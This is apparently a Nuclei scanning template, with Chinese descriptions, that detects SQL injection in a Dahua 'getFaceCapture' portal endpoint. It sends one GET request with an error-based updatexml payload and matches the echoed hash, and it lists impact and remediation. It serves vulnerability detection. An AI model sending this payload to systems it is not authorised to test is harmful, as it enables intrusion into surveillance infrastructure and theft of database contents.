id: dahua-getfacecapture-sqli
info:
  name: 大华 getfacecapture 接口 - SQL 注入漏洞
  author: secking
  severity: high
  description: |
    该模板用于检测 大华 getfacecapture 接口 - SQL 注入漏洞。该类漏洞通常源于接口将用户输入拼接到 SQL 语句中，导致攻击者可改变查询语义。模板主要向 `/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%2...` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://www.dahuatech.com/
  metadata:
    verified: true
    max-request: 1
    vendor: dahua
    product: dahua
  tags: sqli,vuln,dahua
variables:
  rStr3: '{{rand_int(10000, 99999)}}'
http:
  - method: GET
    path:
      - '{{BaseURL}}/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5({{rStr3}})),0x7e),1)--%22%7D/extend/%7B%7D'
    redirects: false
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 500 && contains(body, substr(md5(to_string(rStr3)), 2, 28))'
